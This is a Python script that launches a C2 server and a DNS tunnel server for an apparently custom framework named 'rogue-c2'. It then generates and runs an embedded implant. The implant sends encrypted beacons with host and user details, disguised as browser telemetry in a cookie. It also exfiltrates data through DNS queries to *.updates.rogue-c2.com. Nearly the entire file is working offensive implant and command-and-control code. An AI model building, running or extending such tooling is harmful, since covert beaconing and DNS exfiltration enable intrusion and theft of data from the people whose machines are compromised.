#!/usr/bin/env python3
"""
Start C2 with DNS tunneling enabled
"""

import os
import sys
import time
import threading
import subprocess
from pathlib import Path

def start_dns_server():
    """Start DNS server."""
    print("Starting DNS server on port 5353...")
    
    dns_script = """
import sys
sys.path.append('.')
from payloads.dnstunnel import DNSTunnel
import time

tunnel = DNSTunnel(
    domain='updates.rogue-c2.com',
    mode='server',
    listen_ip='0.0.0.0',
    listen_port=5353
)

print('[+] DNS tunnel server starting on port 5353')
print('[+] Domain: *.updates.rogue-c2.com')

try:
    tunnel.start_server()
except Exception as e:
    print(f'[!] DNS server error: {e}')
    import traceback
    traceback.print_exc()
"""
    
    # Write script to file
    script_path = Path(__file__).parent / "dns_server_temp.py"
    with open(script_path, 'w') as f:
        f.write(dns_script)
    
    # Start DNS server
    dns_proc = subprocess.Popen(
        [sys.executable, str(script_path)],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )
    
    # Wait a bit for server to start
    time.sleep(3)
    
    # Check if server is running
    if dns_proc.poll() is None:
        print(f"✅ DNS server started (PID: {dns_proc.pid})")
        return dns_proc
    else:
        print("❌ DNS server failed to start")
        # Read output
        output, _ = dns_proc.communicate()
        print(f"Output: {output}")
        return None

def start_c2_server():
    """Start C2 server."""
    print("Starting C2 server on port 4444...")
    
    c2_proc = subprocess.Popen(
        [sys.executable, "c2.py"],
        cwd=Path(__file__).parent,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )
    
    # Wait for server to start
    time.sleep(5)
    
    # Check if server is running
    if c2_proc.poll() is None:
        print(f"✅ C2 server started (PID: {c2_proc.pid})")
        return c2_proc
    else:
        print("❌ C2 server failed to start")
        # Read output
        output, _ = c2_proc.communicate()
        print(f"Output: {output}")
        return None

def test_dns_connectivity():
    """Test DNS connectivity."""
    print("\nTesting DNS connectivity...")
    
    test_script = """
import sys
sys.path.append('.')
sys.path.append('./payloads')
import socket
import dns.resolver

# Test DNS resolution
resolver = dns.resolver.Resolver()
resolver.nameservers = ['127.0.0.1']
resolver.port = 5353

try:
    # Test query
    answer = resolver.resolve('test.updates.rogue-c2.com', 'A', lifetime=5)
    print(f'✅ DNS resolution working: {answer}')
except Exception as e:
    print(f'❌ DNS resolution failed: {e}')
    print('Note: This is expected if no DNS server is configured for the domain')
"""
    
    result = subprocess.run(
        [sys.executable, "-c", test_script],
        cwd=Path(__file__).parent,
        capture_output=True,
        text=True
    )
    
    print(result.stdout)
    if result.stderr:
        print(f"Stderr: {result.stderr}")
    
    return "✅ DNS resolution working" in result.stdout

def create_external_implant():
    """Create external implant for testing."""
    print("\nCreating external implant for testing...")
    
    implant_code = '''#!/usr/bin/env python3
"""
External implant for DNS tunneling test
"""

import os
import sys
import json
import base64
import time
import hashlib
import requests
from cryptography.fernet import Fernet

# Configuration
C2_URL = "http://127.0.0.1:4444"
IMPLANT_ID = "external_dns_test_001"
FINGERPRINT = hashlib.sha256(b"external_implant_fingerprint").hexdigest()

def handshake():
    """Perform handshake with C2."""
    print("[+] Performing handshake...")
    
    data = {
        "implant_id": IMPLANT_ID,
        "implant_id_hash": hashlib.md5(IMPLANT_ID.encode()).hexdigest()[:8],
        "fingerprint": FINGERPRINT
    }
    
    try:
        response = requests.post(
            f"{C2_URL}/handshake",
            json=data,
            timeout=10
        )
        
        if response.status_code == 200:
            result = response.json()
            print(f"[+] Handshake successful")
            print(f"[+] Session key: {result.get('key', 'NO KEY')[:20]}...")
            return result.get('key')
        else:
            print(f"[-] Handshake failed: {response.status_code}")
            print(f"[-] Response: {response.text}")
            return None
            
    except Exception as e:
        print(f"[-] Handshake error: {e}")
        return None

def beacon(session_key, use_dns=False):
    """Send beacon to C2."""
    print(f"[+] Sending beacon (DNS: {use_dns})...")
    
    # Create beacon data
    beacon_data = {
        "implant_id": IMPLANT_ID,
        "timestamp": time.time(),
        "system_info": {
            "hostname": "external-test-host",
            "platform": sys.platform,
            "python_version": sys.version,
            "user": os.environ.get('USER', 'unknown')
        },
        "use_dns": use_dns,
        "dns_capable": True,
        "location": "external_test"
    }
    
    # Encrypt with session key
    f = Fernet(session_key.encode())
    encrypted = f.encrypt(json.dumps(beacon_data).encode())
    
    # Send beacon
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Authorization': f'Bearer {IMPLANT_ID}',
        'Cookie': f'session={base64.b64encode(encrypted).decode()}'
    }
    
    try:
        response = requests.post(
            f"{C2_URL}/api/v1/telemetry",
            headers=headers,
            timeout=10
        )
        
        if response.status_code == 200:
            result = response.json()
            print(f"[+] Beacon successful")
            print(f"[+] Response: {result}")
            
            # Check for DNS tunnel status
            if use_dns and result.get('dns_tunnel'):
                print("[+] DNS tunnel enabled by C2!")
            elif use_dns:
                print("[-] DNS tunnel not enabled in response")
                
            return result
        else:
            print(f"[-] Beacon failed: {response.status_code}")
            print(f"[-] Response: {response.text}")
            return None
            
    except Exception as e:
        print(f"[-] Beacon error: {e}")
        return None

def test_dns_exfiltration():
    """Test DNS exfiltration directly."""
    print("[+] Testing DNS exfiltration...")
    
    try:
        sys.path.append('./payloads')
        from dnstunnel import DNSFragmenter
        
        fragmenter = DNSFragmenter("updates.rogue-c2.com")
        
        test_data = {
            "type": "dns_test",
            "implant_id": IMPLANT_ID,
            "timestamp": time.time(),
            "message": "Testing DNS exfiltration from external implant"
        }
        
        success = fragmenter.fragment_and_send(
            json.dumps(test_data).encode(),
            filename="dns_test.json",
            session_id=IMPLANT_ID
        )
        
        if success:
            print("[+] DNS exfiltration test successful")
            print("[+] Data sent via DNS queries to: *.updates.rogue-c2.com")
            return True
        else:
            print("[-] DNS exfiltration test failed")
            return False
            
    except Exception as e:
        print(f"[-] DNS exfiltration error: {e}")
        import traceback
        traceback.print_exc()
        return False

def main():
    """Main function."""
    print("=" * 60)
    print("External Implant - DNS Tunneling Test")
    print("=" * 60)
    
    # Step 1: Handshake
    session_key = handshake()
    if not session_key:
        print("[-] Cannot continue without session key")
        return
    
    # Step 2: Beacon with DNS request
    print("\\n[1] Testing beacon with DNS request...")
    beacon_result = beacon(session_key, use_dns=True)
    
    if beacon_result:
        print("[+] HTTP beacon with DNS request successful")
    else:
        print("[-] HTTP beacon failed, trying without DNS...")
        beacon(session_key, use_dns=False)
    
    # Step 3: Test DNS exfiltration
    print("\\n[2] Testing direct DNS exfiltration...")
    dns_success = test_dns_exfiltration()
    
    if dns_success:
        print("[+] DNS exfiltration working!")
    else:
        print("[-] DNS exfiltration test failed")
    
    print("\\n" + "=" * 60)
    print("Test complete")
    print("=" * 60)

if __name__ == "__main__":
    main()
'''
    
    implant_path = Path(__file__).parent / "external_implant_test.py"
    with open(implant_path, 'w') as f:
        f.write(implant_code)
    
    # Make executable
    implant_path.chmod(0o755)
    
    print(f"✅ External implant created: {implant_path}")
    return implant_path

def run_external_implant():
    """Run the external implant test."""
    print("\nRunning external implant test...")
    
    implant_path = Path(__file__).parent / "external_implant_test.py"
    
    if not implant_path.exists():
        print("❌ External implant not found")
        return False
    
    # Run implant
    result = subprocess.run(
        [sys.executable, str(implant_path)],
        cwd=Path(__file__).parent,
        capture_output=True,
        text=True
    )
    
    print("\n" + "="*60)
    print("External Implant Output:")
    print("="*60)
    print(result.stdout)
    
    if result.stderr:
        print("\nStderr:")
        print(result.stderr)
    
    # Check for success indicators
    success_indicators = [
        "Handshake successful",
        "Beacon successful",
        "DNS exfiltration test successful",
        "DNS tunnel enabled by C2"
    ]
    
    success_count = 0
    for indicator in success_indicators:
        if indicator in result.stdout:
            success_count += 1
            print(f"✅ {indicator}")
    
    print(f"\nSuccess indicators: {success_count}/{len(success_indicators)}")
    
    return success_count >= 2  # At least handshake and one other success

def main():
    """Main function."""
    print("Starting C2 with DNS tunneling for external implant test")
    print("="*60)
    
    # Start DNS server
    dns_proc = start_dns_server()
    if not dns_proc:
        print("❌ Cannot continue without DNS server")
        return 1
    
    # Start C2 server
    c2_proc = start_c2_server()
    if not c2_proc:
        print("❌ Cannot continue without C2 server")
        dns_proc.terminate()
        return 1
    
    try:
        # Test DNS connectivity
        if not test_dns_connectivity():
            print("⚠️ DNS connectivity test inconclusive")
        
        # Create external implant
        implant_path = create_external_implant()
        
        # Give servers time to stabilize
        print("\nWaiting for servers to stabilize...")
        time.sleep(5)
        
        # Run external implant test
        print("\n" + "="*60)
        print("Running external implant test...")
        print("="*60)
        
        implant_success = run_external_implant()
        
        print("\n" + "="*60)
        if implant_success:
            print("✅ EXTERNAL IMPLANT TEST SUCCESSFUL!")
            print("\nDNS tunneling is working with external implants.")
            print("\nNext: Implement mTLS for enhanced security.")
        else:
            print("⚠️ External implant test had issues")
            print("\nCheck the output above for errors.")
            print("Common issues:")
            print("- C2 session key storage bug (known issue)")
            print("- DNS server not properly configured")
            print("- Firewall blocking ports")
        
        print("\nServers are still running.")
        print(f"C2: http://127.0.0.1:4444")
        print(f"DNS: port 5353 (updates.rogue-c2.com)")
        print("\nPress Ctrl+C to stop servers.")
        
        # Keep running
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n\nStopping servers...")
    finally:
        # Cleanup
        if c2_proc:
            c2_proc.terminate()
            c2_proc.wait()
            print("✅ C2 server stopped")
        
        if dns_proc:
            dns_proc.terminate()
            dns_proc.wait()
            print("✅ DNS server stopped")
    
    return 0

if __name__ == "__main__":
    sys.exit(main())